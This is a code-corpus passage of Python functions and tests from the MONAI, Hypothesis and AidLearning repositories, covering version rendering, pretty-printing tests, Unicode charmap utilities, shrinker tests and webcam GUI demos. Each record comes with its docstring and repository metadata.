{"docstring": "\"\"\"Build up version string, with post-release \"local version identifier\".\n\nOur goal: TAG[+DISTANCE.gHEX[.dirty]] . Note that if you\nget a tagged build and then dirty it, you'll get TAG+0.gHEX.dirty\n\nExceptions:\n1: no tags. git_describe was just HEX. 0+untagged.DISTANCE.gHEX[.dirty]\n\"\"\"\n", "func_signal": "def render_pep440(pieces):\n", "code": "if pieces[\"closest-tag\"]:\n    rendered = pieces[\"closest-tag\"]\n    if pieces[\"distance\"] or pieces[\"dirty\"]:\n        rendered += plus_or_dot(pieces)\n        rendered += \"%d.g%s\" % (pieces[\"distance\"], pieces[\"short\"])\n        if pieces[\"dirty\"]:\n            rendered += \".dirty\"\nelse:\n    # exception #1\n    rendered = \"0+untagged.%d.g%s\" % (pieces[\"distance\"], pieces[\"short\"])\n    if pieces[\"dirty\"]:\n        rendered += \".dirty\"\nreturn rendered", "path": "MONAI/versioneer.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"testing no inplace change to the hashed item\"\"\"\n", "func_signal": "def test_cache(self):\n", "code": "items = [[list(range(i))] for i in range(5)]\n\nclass _InplaceXform(Transform):\n    def __call__(self, data):\n        if data:\n            data[0] = data[0] + np.pi\n        else:\n            data.append(1)\n        return data\n\nwith tempfile.TemporaryDirectory() as tempdir:\n    ds = LMDBDataset(items, transform=_InplaceXform(), cache_dir=tempdir, lmdb_kwargs={\"map_size\": 10 * 1024})\n    self.assertEqual(items, [[[]], [[0]], [[0, 1]], [[0, 1, 2]], [[0, 1, 2, 3]]])\n    ds1 = LMDBDataset(items, transform=_InplaceXform(), cache_dir=tempdir, lmdb_kwargs={\"map_size\": 10 * 1024})\n    self.assertEqual(list(ds1), list(ds))\n    self.assertEqual(items, [[[]], [[0]], [[0, 1]], [[0, 1, 2]], [[0, 1, 2, 3]]])\n\n    ds = LMDBDataset(\n        items,\n        transform=_InplaceXform(),\n        cache_dir=tempdir,\n        lmdb_kwargs={\"map_size\": 10 * 1024},\n        hash_func=json_hashing,\n    )\n    self.assertEqual(items, [[[]], [[0]], [[0, 1]], [[0, 1, 2]], [[0, 1, 2, 3]]])\n    ds1 = LMDBDataset(\n        items,\n        transform=_InplaceXform(),\n        cache_dir=tempdir,\n        lmdb_kwargs={\"map_size\": 10 * 1024},\n        hash_func=json_hashing,\n    )\n    self.assertEqual(list(ds1), list(ds))\n    self.assertEqual(items, [[[]], [[0]], [[0, 1]], [[0, 1, 2]], [[0, 1, 2, 3]]])\n\nself.assertTrue(isinstance(ds1.info(), dict))", "path": "MONAI/tests/test_lmdbdataset.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "# same test as for compute_meandice\n", "func_signal": "def test_value_class(self, input_data, expected_value):\n", "code": "        vals = dict()\n        vals[\"y_pred\"] = input_data.pop(\"y_pred\")\n        vals[\"y\"] = input_data.pop(\"y\")\n        dice_metric = DiceMetric(**input_data, reduction=\"none\")\n        result, _ = dice_metric(**vals)\n        np.testing.assert_allclose(result.cpu().numpy(), expected_value, atol=1e-4)", "path": "MONAI/tests/test_compute_meandice.py", "commit_date": "2020-11-06 00:00:00", "repo_name": "Project-MONAI/MONAI", "stars": 5110, "license": "apache-2.0", "language": "python", "size": 66698}
{"docstring": "\"\"\"Test that p.break_ produces expected output.\"\"\"\n", "func_signal": "def test_pprint_break():\n", "code": "output = pretty.pretty(Breaking())\nexpected = \"TG: Breaking(\\n    ):\"\nassert_equal(output, expected)", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Return a tuple of Unicode categories in a normalised order.\n\nThis function expands one-letter designations of a major class to include\nall subclasses:\n\n>>> as_general_categories(['N'])\n('Nd', 'Nl', 'No')\n\nSee section 4.5 of the Unicode standard for more on classes:\nhttps://www.unicode.org/versions/Unicode10.0.0/ch04.pdf\n\nIf the collection ``cats`` includes any elements that do not represent a\nmajor class or a class with subclass, a deprecation warning is raised.\n\"\"\"\n", "func_signal": "def as_general_categories(cats, name=\"cats\"):\n", "code": "if cats is None:\n    return None\nmajor_classes = (\"L\", \"M\", \"N\", \"P\", \"S\", \"Z\", \"C\")\ncs = categories()\nout = set(cats)\nfor c in cats:\n    if c in major_classes:\n        out.discard(c)\n        out.update(x for x in cs if x.startswith(c))\n    elif c not in cs:\n        raise InvalidArgument(\n            \"In %s=%r, %r is not a valid Unicode category.\" % (name, cats, c)\n        )\nreturn tuple(c for c in cs if c in out)", "path": "hypothesis/hypothesis-python/src/hypothesis/internal/charmap.py", "commit_date": "2020-10-20 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Test that the _repr_pretty_ method is tested for callability and skipped\nif not.\"\"\"\n", "func_signal": "def test_callability_checking():\n", "code": "gotoutput = pretty.pretty(Dummy2())\nexpectedoutput = \"Dummy1(...)\"\n\nassert_equal(gotoutput, expectedoutput)", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "# Create OrderedDict with cycle\n", "func_signal": "def test_collections_ordereddict():\n", "code": "a = OrderedDict()\na[\"key\"] = a\n\ncases = [\n    (OrderedDict(), \"OrderedDict()\"),\n    (\n        OrderedDict((i, i) for i in range(1000, 1010)),\n        \"OrderedDict([(1000, 1000),\\n\"\n        \"             (1001, 1001),\\n\"\n        \"             (1002, 1002),\\n\"\n        \"             (1003, 1003),\\n\"\n        \"             (1004, 1004),\\n\"\n        \"             (1005, 1005),\\n\"\n        \"             (1006, 1006),\\n\"\n        \"             (1007, 1007),\\n\"\n        \"             (1008, 1008),\\n\"\n        \"             (1009, 1009)])\",\n    ),\n    (a, \"OrderedDict([('key', OrderedDict(...))])\"),\n]\nfor obj, expected in cases:\n    assert_equal(pretty.pretty(obj), expected)", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "# Block off lowering the whole buffer\n", "func_signal": "def shrinker(data):\n", "code": "if data.draw_bits(1) == 0:\n    data.mark_invalid()\nm = data.draw_bits(8)\nfor _ in range(n_gap):\n    data.draw_bits(8)\nn = data.draw_bits(16)\n\nif n == m + 1:\n    data.mark_interesting()", "path": "hypothesis/hypothesis-python/tests/conjecture/test_shrinker.py", "commit_date": "2020-08-07 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Merge two sequences of intervals into a single tuple of intervals.\n\nAny integer bounded by `x` or `y` is also bounded by the result.\n\n>>> _union_intervals([(3, 10)], [(1, 2), (5, 17)])\n((1, 17),)\n\"\"\"\n", "func_signal": "def _union_intervals(x, y):\n", "code": "if not x:\n    return tuple((u, v) for u, v in y)\nif not y:\n    return tuple((u, v) for u, v in x)\nintervals = sorted(x + y, reverse=True)\nresult = [intervals.pop()]\nwhile intervals:\n    # 1. intervals is in descending order\n    # 2. pop() takes from the RHS.\n    # 3. (a, b) was popped 1st, then (u, v) was popped 2nd\n    # 4. Therefore: a <= u\n    # 5. We assume that u <= v and a <= b\n    # 6. So we need to handle 2 cases of overlap, and one disjoint case\n    #    |   u--v     |   u----v   |       u--v  |\n    #    |   a----b   |   a--b     |  a--b       |\n    u, v = intervals.pop()\n    a, b = result[-1]\n    if u <= b + 1:\n        # Overlap cases\n        result[-1] = (a, max(v, b))\n    else:\n        # Disjoint case\n        result.append((u, v))\nreturn tuple(result)", "path": "hypothesis/hypothesis-python/src/hypothesis/internal/charmap.py", "commit_date": "2020-10-20 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Return a tuple of intervals, covering the codepoints of characters in\n`s`.\n\n>>> _intervals('abcdef0123456789')\n((48, 57), (97, 102))\n\"\"\"\n", "func_signal": "def _intervals(s):\n", "code": "intervals = tuple((ord(c), ord(c)) for c in sorted(s))\nreturn _union_intervals(intervals, intervals)", "path": "hypothesis/hypothesis-python/src/hypothesis/internal/charmap.py", "commit_date": "2020-10-20 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "# Create defaultdicts with cycles\n", "func_signal": "def test_collections_defaultdict():\n", "code": "a = defaultdict()\na.default_factory = a\nb = defaultdict(list)\nb[\"key\"] = b\n\n# Dictionary order cannot be relied on, test against single keys.\ncases = [\n    (defaultdict(list), \"defaultdict(list, {})\"),\n    (\n        defaultdict(list, {\"key\": \"-\" * 50}),\n        \"defaultdict(list,\\n\"\n        \"            {'key': '-----------------------------------------\"\n        \"---------'})\",\n    ),\n    (a, \"defaultdict(defaultdict(...), {})\"),\n    (b, \"defaultdict(list, {'key': defaultdict(...)})\"),\n]\nfor obj, expected in cases:\n    assert_equal(pretty.pretty(obj), expected)", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Test correct indentation in groups.\"\"\"\n", "func_signal": "def test_indentation():\n", "code": "count = 40\ngotoutput = pretty.pretty(MyList(range(count)))\nexpectedoutput = \"MyList(\\n\" + \",\\n\".join(\"   %d\" % i for i in range(count)) + \")\"\n\nassert_equal(gotoutput, expectedoutput)", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Test that pprint works for heap allocated types.\"\"\"\n", "func_signal": "def test_pprint_heap_allocated_type():\n", "code": "import xxlimited\n\noutput = pretty.pretty(xxlimited.Null)\nassert_equal(output, \"xxlimited.Null\")", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Return a tuple of codepoint intervals covering characters that match one\nor more categories in the tuple of categories `key`.\n\n>>> _query_for_key(categories())\n((0, 1114111),)\n>>> _query_for_key(('Zl', 'Zp', 'Co'))\n((8232, 8233), (57344, 63743), (983040, 1048573), (1048576, 1114109))\n\"\"\"\n", "func_signal": "def _query_for_key(key):\n", "code": "try:\n    return category_index_cache[key]\nexcept KeyError:\n    pass\nassert key\nif set(key) == set(categories()):\n    result = ((0, sys.maxunicode),)\nelse:\n    result = _union_intervals(_query_for_key(key[:-1]), charmap()[key[-1]])\ncategory_index_cache[key] = result\nreturn result", "path": "hypothesis/hypothesis-python/src/hypothesis/internal/charmap.py", "commit_date": "2020-10-20 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "# Tests iteration while the shape of the thing being iterated over can\n# change. In particular the current example can go from trivial to non\n# trivial.\n\n", "func_signal": "def test_finding_a_minimal_balanced_binary_tree():\n", "code": "def tree(data):\n    # Returns height of a binary tree and whether it is height balanced.\n    data.start_example(\"tree\")\n    n = data.draw_bits(1)\n    if n == 0:\n        result = (1, True)\n    else:\n        h1, b1 = tree(data)\n        h2, b2 = tree(data)\n        result = (1 + max(h1, h2), b1 and b2 and abs(h1 - h2) <= 1)\n    data.stop_example(\"tree\")\n    return result\n\n# Starting from an unbalanced tree of depth six\n@shrinking_from([1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0])\ndef shrinker(data):\n    _, b = tree(data)\n    if not b:\n        data.mark_interesting()\n\nshrinker.shrink()\n\nassert list(shrinker.shrink_target.buffer) == [1, 0, 1, 0, 1, 0, 0]", "path": "hypothesis/hypothesis-python/tests/conjecture/test_shrinker.py", "commit_date": "2020-08-07 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "# Unit test extracted from a failure in tests/nocover/test_integers.py\n", "func_signal": "def test_dependent_block_pairs_is_up_to_shrinking_integers():\n", "code": "distribution = Sampler([4.0, 8.0, 1.0, 1.0, 0.5])\n\nsizes = [8, 16, 32, 64, 128]\n\n@shrinking_from(b\"\\x03\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\x01\")\ndef shrinker(data):\n    size = sizes[distribution.sample(data)]\n    result = data.draw_bits(size)\n    sign = (-1) ** (result & 1)\n    result = (result >> 1) * sign\n    cap = data.draw_bits(8)\n\n    if result >= 32768 and cap == 1:\n        data.mark_interesting()\n\nshrinker.fixate_shrink_passes([\"minimize_individual_blocks\"])\nassert list(shrinker.shrink_target.buffer) == [1, 1, 0, 1, 0, 0, 1]", "path": "hypothesis/hypothesis-python/tests/conjecture/test_shrinker.py", "commit_date": "2020-08-07 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Test that pprint works for classes with no __module__.\"\"\"\n", "func_signal": "def test_pprint_nomod():\n", "code": "output = pretty.pretty(NoModule)\nassert_equal(output, \"NoModule\")", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Test that set and frozenset use Python 3 formatting.\"\"\"\n", "func_signal": "def test_sets():\n", "code": "objects = [\n    set(),\n    frozenset(),\n    {1},\n    frozenset([1]),\n    {1, 2},\n    frozenset([1, 2]),\n    {-1, -2, -3},\n]\nexpected = [\n    \"set()\",\n    \"frozenset()\",\n    \"{1}\",\n    \"frozenset({1})\",\n    \"{1, 2}\",\n    \"frozenset({1, 2})\",\n    \"{-3, -2, -1}\",\n]\nfor obj, expected_output in zip(objects, expected):\n    got_output = pretty.pretty(obj)\n    assert_equal(got_output, expected_output)", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Return a normalised tuple of all Unicode categories that are in\n`include`, but not in `exclude`.\n\nIf include is None then default to including all categories.\nAny item in include that is not a unicode character will be excluded.\n\n>>> _category_key(exclude=['So'], include=['Lu', 'Me', 'Cs', 'So'])\n('Me', 'Lu', 'Cs')\n\"\"\"\n", "func_signal": "def _category_key(exclude, include):\n", "code": "cs = categories()\nif include is None:\n    include = set(cs)\nelse:\n    include = set(include)\nexclude = set(exclude or ())\nassert include.issubset(cs)\nassert exclude.issubset(cs)\ninclude -= exclude\nreturn tuple(c for c in cs if c in include)", "path": "hypothesis/hypothesis-python/src/hypothesis/internal/charmap.py", "commit_date": "2020-10-20 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Test that p.break_ is used in repr.\"\"\"\n", "func_signal": "def test_pprint_break_repr():\n", "code": "output = pretty.pretty(BreakingReprParent())\nexpected = \"TG: Breaking(\\n    ):\"\nassert_equal(output, expected)", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "# Create deque with cycle\n", "func_signal": "def test_collections_deque():\n", "code": "a = deque()\na.append(a)\n\ncases = [\n    (deque(), \"deque([])\"),\n    (\n        deque(i for i in range(1000, 1020)),\n        \"deque([1000,\\n\"\n        \"       1001,\\n\"\n        \"       1002,\\n\"\n        \"       1003,\\n\"\n        \"       1004,\\n\"\n        \"       1005,\\n\"\n        \"       1006,\\n\"\n        \"       1007,\\n\"\n        \"       1008,\\n\"\n        \"       1009,\\n\"\n        \"       1010,\\n\"\n        \"       1011,\\n\"\n        \"       1012,\\n\"\n        \"       1013,\\n\"\n        \"       1014,\\n\"\n        \"       1015,\\n\"\n        \"       1016,\\n\"\n        \"       1017,\\n\"\n        \"       1018,\\n\"\n        \"       1019])\",\n    ),\n    (a, \"deque([deque(...)])\"),\n]\nfor obj, expected in cases:\n    assert_equal(pretty.pretty(obj), expected)", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Don't catch bad repr errors.\"\"\"\n", "func_signal": "def test_bad_repr():\n", "code": "with assert_raises(ZeroDivisionError):\n    pretty.pretty(BadRepr())", "path": "hypothesis/hypothesis-python/tests/cover/test_pretty.py", "commit_date": "2020-01-06 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "\"\"\"Return a dict that maps a Unicode category, to a tuple of 2-tuples\ncovering the codepoint intervals for characters in that category.\n\n>>> charmap()['Co']\n((57344, 63743), (983040, 1048573), (1048576, 1114109))\n\"\"\"\n", "func_signal": "def charmap():\n", "code": "global _charmap\n# Best-effort caching in the face of missing files and/or unwritable\n# filesystems is fairly simple: check if loaded, else try loading,\n# else calculate and try writing the cache.\nif _charmap is None:\n    f = charmap_file()\n    try:\n        with gzip.GzipFile(f, \"rb\") as i:\n            tmp_charmap = dict(json.load(i))\n\n    except Exception:\n        # This loop is reduced to using only local variables for performance;\n        # indexing and updating containers is a ~3x slowdown.  This doesn't fix\n        # https://github.com/HypothesisWorks/hypothesis/issues/2108 but it helps.\n        category = unicodedata.category  # Local variable -> ~20% speedup!\n        tmp_charmap = {}\n        last_cat = category(chr(0))\n        last_start = 0\n        for i in range(1, sys.maxunicode + 1):\n            cat = category(chr(i))\n            if cat != last_cat:\n                tmp_charmap.setdefault(last_cat, []).append([last_start, i - 1])\n                last_cat, last_start = cat, i\n        tmp_charmap.setdefault(last_cat, []).append([last_start, sys.maxunicode])\n\n        try:\n            # Write the Unicode table atomically\n            tmpdir = storage_directory(\"tmp\")\n            mkdir_p(tmpdir)\n            fd, tmpfile = tempfile.mkstemp(dir=tmpdir)\n            os.close(fd)\n            # Explicitly set the mtime to get reproducible output\n            with gzip.GzipFile(tmpfile, \"wb\", mtime=1) as o:\n                result = json.dumps(sorted(tmp_charmap.items()))\n                o.write(result.encode())\n\n            os.renames(tmpfile, f)\n        except Exception:\n            pass\n\n    # convert between lists and tuples\n    _charmap = {\n        k: tuple(tuple(pair) for pair in pairs) for k, pairs in tmp_charmap.items()\n    }\n    # each value is a tuple of 2-tuples (that is, tuples of length 2)\n    # and that both elements of that tuple are integers.\n    for vs in _charmap.values():\n        ints = list(sum(vs, ()))\n        assert all(isinstance(x, int) for x in ints)\n        assert ints == sorted(ints)\n        assert all(len(tup) == 2 for tup in vs)\n\nassert _charmap is not None\nreturn _charmap", "path": "hypothesis/hypothesis-python/src/hypothesis/internal/charmap.py", "commit_date": "2020-10-20 00:00:00", "repo_name": "HypothesisWorks/hypothesis", "stars": 7180, "license": "other", "language": "python", "size": 37194}
{"docstring": "#creating a container VBox type, vertical (you can use also HBox or Widget)\n", "func_signal": "def main(self):\n", "code": "main_container = gui.VBox(width=360, height=680, style={'margin':'0px auto'})\n\nself.aidcam = OpencvVideoWidget(self, width=340, height=480)\nself.aidcam.style['margin'] = '10px'\n\nself.aidcam.set_identifier(\"myimage_receiver\")\nmain_container.append(self.aidcam)\nself.lbl = gui.Label('This show fps!', width=360, height=30,  margin='50px',)\nmain_container.append(self.lbl)\n\nreturn main_container", "path": "AidLearning-FrameWork/src/facencnn/facepose.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "# Detection confidence threshold to draw bounding box\n", "func_signal": "def main():\n", "code": "score_thresh = 0.60\n\nvs=cvs.VideoCapture(1)\n\n# max number of hands we want to detect/track\nnum_hands_detect = 1\n\n# Used to calculate fps\nstart_time = datetime.datetime.now()\nnum_frames = 0\n\nim_height, im_width = (None, None)\n\ntry:\n    while True:\n        sleep(30)\n        # Read Frame and process\n        frame =cvs.read()\n        if frame is None:\n            continue\n        frame = cv2.resize(frame, (640, 480))\n\n        if im_height == None:\n            im_height, im_width = frame.shape[:2]\n\n        # Convert image to rgb since opencv loads images in bgr, if not accuracy will decrease\n        try:\n            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n        except:\n            print(\"Error converting to RGB\")\n\n        # Run image through tensorflow graph\n        boxes, scores, classes = detector_utils.detect_objects(\n            frame, detection_graph, sess)\n        \n        \n        # Draw bounding boxeses and text\n        detector_utils.draw_box_on_image(\n            num_hands_detect, score_thresh, scores, boxes, classes, im_width, im_height, frame)\n\n        # Calculate Frames per second (FPS)\n        num_frames += 1\n        elapsed_time = (datetime.datetime.now() -\n                        start_time).total_seconds()\n        fps = num_frames / elapsed_time\n        \n        # Display FPS on frame\n        lbs = \"FPS : \" + str(\"{0:.2f}\".format(fps))\n        cvs.setLbs(lbs)\n\n        if args['display']:\n            \n            detector_utils.draw_text_on_image(\"FPS : \" + str(\"{0:.2f}\".format(fps)), frame)\n\n            cvs.imshow(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))\n\n    \n    print(\"Average FPS: \", str(\"{0:.2f}\".format(fps)))\n\n    \n\nexcept KeyboardInterrupt:\n    print(\"Average FPS: \", str(\"{0:.2f}\".format(fps)))", "path": "AidLearning-FrameWork/src/handtf/webcam.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "#creating a container VBox type, vertical (you can use also HBox or Widget)\n", "func_signal": "def main(self):\n", "code": "main_container = gui.VBox(width=360, height=680, style={'margin':'0px auto'})\n\nself.aidcam = OpencvVideoWidget(self, width=340, height=480)\nself.aidcam.style['margin'] = '10px'\n\nself.aidcam.set_identifier(\"myimage_receiver\")\nmain_container.append(self.aidcam)\n \n# returning the root widget\nreturn main_container", "path": "AidLearning-FrameWork/gui_cvs/cam.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "#idle function called every update cycle\n", "func_signal": "def idle(self):\n", "code": "self.lbl.set_text(cvs.getLbs())\npass", "path": "AidLearning-FrameWork/src/singlepose/webpose.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "#idle function called every update cycle\n", "func_signal": "def idle(self):\n", "code": "self.lbl.set_text(cvs.getLbs())\npass", "path": "AidLearning-FrameWork/src/handtf/webcam.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "\"\"\"Creates dictionary of COCO compatible categories keyed by category id.\n\nArgs:\n  categories: a list of dicts, each of which has the following keys:\n    'id': (required) an integer id uniquely identifying this category.\n    'name': (required) string representing category name\n      e.g., 'cat', 'dog', 'pizza'.\n\nReturns:\n  category_index: a dict containing the same entries as categories, but keyed\n    by the 'id' field of each category.\n\"\"\"\n", "func_signal": "def create_category_index(categories):\n", "code": "category_index = {}\nfor cat in categories:\n    category_index[cat['id']] = cat\nreturn category_index", "path": "AidLearning-FrameWork/src/handtf/utils/label_map_util.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "# Definite input and output Tensors for detection_graph\n", "func_signal": "def detect_objects(image_np, detection_graph, sess):\n", "code": "image_tensor = detection_graph.get_tensor_by_name('image_tensor:0')\n# Each box represents a part of the image where a particular object was detected.\ndetection_boxes = detection_graph.get_tensor_by_name(\n    'detection_boxes:0')\n# Each score represent how level of confidence for each of the objects.\n# Score is shown on the result image, together with the class label.\ndetection_scores = detection_graph.get_tensor_by_name(\n    'detection_scores:0')\ndetection_classes = detection_graph.get_tensor_by_name(\n    'detection_classes:0')\nnum_detections = detection_graph.get_tensor_by_name(\n    'num_detections:0')\n\nimage_np_expanded = np.expand_dims(image_np, axis=0)\n\n(boxes, scores, classes, num) = sess.run(\n    [detection_boxes, detection_scores,\n        detection_classes, num_detections],\n    feed_dict={image_tensor: image_np_expanded})\nreturn np.squeeze(boxes), np.squeeze(scores), np.squeeze(classes)", "path": "AidLearning-FrameWork/src/handtf/utils/detector_utils.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "#creating a container VBox type, vertical (you can use also HBox or Widget)\n", "func_signal": "def main(self):\n", "code": "main_container = gui.VBox(width=360, height=680, style={'margin':'0px auto'})\n\nself.aidcam = OpencvVideoWidget(self, width=340, height=480)\nself.aidcam.style['margin'] = '10px'\n\nself.aidcam.set_identifier(\"myimage_receiver\")\nmain_container.append(self.aidcam)\n\n#label show fps\nself.lbl = gui.Label('This show FPS!', width=360, height=30,left='100px', margin='10px')\nmain_container.append(self.lbl)\n\nreturn main_container", "path": "AidLearning-FrameWork/src/singlepose/webpose.py", "commit_date": "2019-08-08 00:00:00", "repo_name": "aidlearning/AidLearning-FrameWork", "stars": 5424, "license": "other", "language": "python", "size": 80473}
{"docstring": "# the margin 0px auto centers the main container\n", "func_signal": "def main(self):\n", "code": "verticalContainer = gui.Widget(width=540, margin='0px auto', style={'display': 'block', 'overflow': 'hidden'})\n\nhorizontalContainer = gui.Widget(width='100%', layout_orientation=gui.Widget.LAYOUT_HORIZONTAL, margin='0px', style={'display': 'block', 'overflow': 'auto'})\n\nsubContainerLeft = gui.Widget(width=320, style={'display': 'block', 'overflow': 'auto', 'text-align': 'center'})\nself.img = gui.Image('/res:logo.png', height=100, margin='10px')\nself.img.onclick.do(self.on_img_clicked)\n\nself.table = gui.Table.new_from_list([('ID', 'First Name', 'Last Name'),\n                           ('101', 'Danny', 'Young'),\n                           ('102', 'Christine', 'Holand'),\n                           ('103', 'Lars', 'Gordon'),\n                           ('104', 'Roberto', 'Robitaille'),\n                           ('105', 'Maria', 'Papadopoulos')], width=300, height=200, margin='10px')\nself.table.on_table_row_click.do(self.on_table_row_click)\n\n# the arguments are\twidth - height - layoutOrientationOrizontal\nsubContainerRight = gui.Widget(style={'width': '220px', 'display': 'block', 'overflow': 'auto', 'text-align': 'center'})\nself.count = 0\nself.counter = gui.Label('', width=200, height=30, margin='10px')\n\nself.lbl = gui.Label('This is a LABEL!', width=200, height=30, margin='10px')\n\nself.bt = gui.Button('Press me!', width=200, height=30, margin='10px')\n# setting the listener for the onclick event of the button\nself.bt.onclick.do(self.on_button_pressed)\n\nself.txt = gui.TextInput(width=200, height=30, margin='10px')\nself.txt.set_text('This is a TEXTAREA')\nself.txt.onchange.do(self.on_text_area_change)\n\nself.spin = gui.SpinBox(1, 0, 100, width=200, height=30, margin='10px')\nself.spin.onchange.do(self.on_spin_change)\n\nself.progress = gui.Progress(1, 100, width=200, height=5)\n\nself.check = gui.CheckBoxLabel('Label checkbox', True, width=200, height=30, margin='10px')\nself.check.onchange.do(self.on_check_change)\n\nself.btInputDiag = gui.Button('Open InputDialog', width=200, height=30, margin='10px')\nself.btInputDiag.onclick.do(self.open_input_dialog)\n\nself.btFileDiag = gui.Button('File Selection Dialog', width=200, height=30, margin='10px')\nself.btFileDiag.onclick.do(self.open_fileselection_dialog)\n\nself.btUploadFile = gui.FileUploader('./', width=200, height=30, margin='10px')\nself.btUploadFile.onsuccess.do(self.fileupload_on_success)\nself.btUploadFile.onfailed.do(self.fileupload_on_failed)\n\nitems = ('Danny Young','Christine Holand','Lars Gordon','Roberto Robitaille')\nself.listView = gui.ListView.new_from_list(items, width=300, height=120, margin='10px')\nself.listView.onselection.do(self.list_view_on_selected)\n\nself.link = gui.Link(\"http://localhost:8081\", \"A link to here\", width=200, height=30, margin='10px')\n\nself.dropDown = gui.DropDown.new_from_list(('DropDownItem 0', 'DropDownItem 1'),\n                                           width=200, height=20, margin='10px')\nself.dropDown.onchange.do(self.drop_down_changed)\nself.dropDown.select_by_value('DropDownItem 0')\n\nself.slider = gui.Slider(10, 0, 100, 5, width=200, height=20, margin='10px')\nself.slider.onchange.do(self.slider_changed)\n\nself.colorPicker = gui.ColorPicker('#ffbb00', width=200, height=20, margin='10px')\nself.colorPicker.onchange.do(self.color_picker_changed)\n\nself.date = gui.Date('2015-04-13', width=200, height=20, margin='10px')\nself.date.onchange.do(self.date_changed)\n\nself.video = gui.Widget( _type='iframe', width=290, height=200, margin='10px')\nself.video.attributes['src'] = \"https://drive.google.com/file/d/0B0J9Lq_MRyn4UFRsblR3UTBZRHc/preview\"\nself.video.attributes['width'] = '100%'\nself.video.attributes['height'] = '100%'\nself.video.attributes['controls'] = 'true'\nself.video.style['border'] = 'none'\n                             \nself.tree = gui.TreeView(width='100%', height=300)\nti1 = gui.TreeItem(\"Item1\")\nti2 = gui.TreeItem(\"Item2\")\nti3 = gui.TreeItem(\"Item3\")\nsubti1 = gui.TreeItem(\"Sub Item1\")\nsubti2 